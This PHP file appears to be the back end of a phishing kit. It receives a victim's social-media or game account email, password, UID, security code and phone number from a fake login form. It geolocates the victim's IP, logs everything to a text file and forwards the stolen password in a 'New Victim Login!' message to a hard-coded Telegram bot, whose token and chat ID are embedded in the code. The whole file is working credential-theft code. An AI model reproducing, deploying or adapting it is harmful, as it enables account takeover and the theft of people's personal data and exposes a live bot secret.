<?php
// Telegram Bot Settings (Yahan apna token aur chat id daalo)
define('BOT_TOKEN', '8840844556:AAHhxntijPwObphI7pW9B7GXFABv1XtGtQ8');
define('CHAT_ID', '7924753922');

function sendToTelegram($message) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    $options = [
        'http' => [
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $platform       = isset($_POST['platform'])        ? $_POST['platform']        : 'Unknown';
    $social_email   = isset($_POST['social_email'])    ? $_POST['social_email']    : '';
    $social_pass    = isset($_POST['social_password']) ? $_POST['social_password'] : '';
    
    $uid            = isset($_POST['uid'])             ? $_POST['uid']             : '';
    $security       = isset($_POST['security_code'])   ? $_POST['security_code']   : '';
    $phone          = isset($_POST['phone'])           ? $_POST['phone']           : '';
    $level          = isset($_POST['account_level'])   ? $_POST['account_level']   : 'N/A';
    
    $ip             = $_SERVER['REMOTE_ADDR'];
    $userAgent      = $_SERVER['HTTP_USER_AGENT'];
    $timestamp      = date('Y-m-d H:i:s');

    $geo_data = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"), true);
    $region  = isset($geo_data['regionName']) ? $geo_data['regionName'] : 'Unknown';
    $city    = isset($geo_data['city'])       ? $geo_data['city']       : 'Unknown';
    $country = isset($geo_data['country'])    ? $geo_data['country']    : 'Unknown';
    $isp     = isset($geo_data['isp'])        ? $geo_data['isp']        : 'Unknown';

    $data = [
        "timestamp"    => $timestamp,
        "uid"          => $uid,
        "email"        => $social_email,
        "password"     => $social_pass,
        "platform"     => $platform,
        "level"        => $level,
        "phone"        => $phone,
        "security_code"=> $security,
        "ip"           => $ip,
        "region"       => $region,
        "city"         => $city,
        "country"      => $country,
        "isp"          => $isp,
        "userAgent"    => $userAgent
    ];

    $json_data = json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    file_put_contents('logs.txt', $json_data . PHP_EOL, FILE_APPEND);

    // Telegram par message bhejo
    $msg = "<b>🚨 New Victim Login!</b>\n\n";
    $msg .= "📱 Platform: <b>$platform</b>\n";
    $msg .= "🆔 UID: <b>$uid</b>\n";
    $msg .= "📧 Email: <b>$social_email</b>\n";
    $msg .= "🔑 Pass: <b>$social_pass</b>\n";
    $msg .= "📞 Phone: <b>$phone</b>\n";
    $msg .= "📊 Level: <b>$level</b>\n";
    $msg .= "🌍 Country: <b>$country</b>\n";
    $msg .= "🏙️ City: <b>$city</b>\n";
    $msg .= "⏱️ Time: <b>$timestamp</b>";
    
    sendToTelegram($msg);

    echo json_encode(['status' => 'success']);
    exit;
}
?>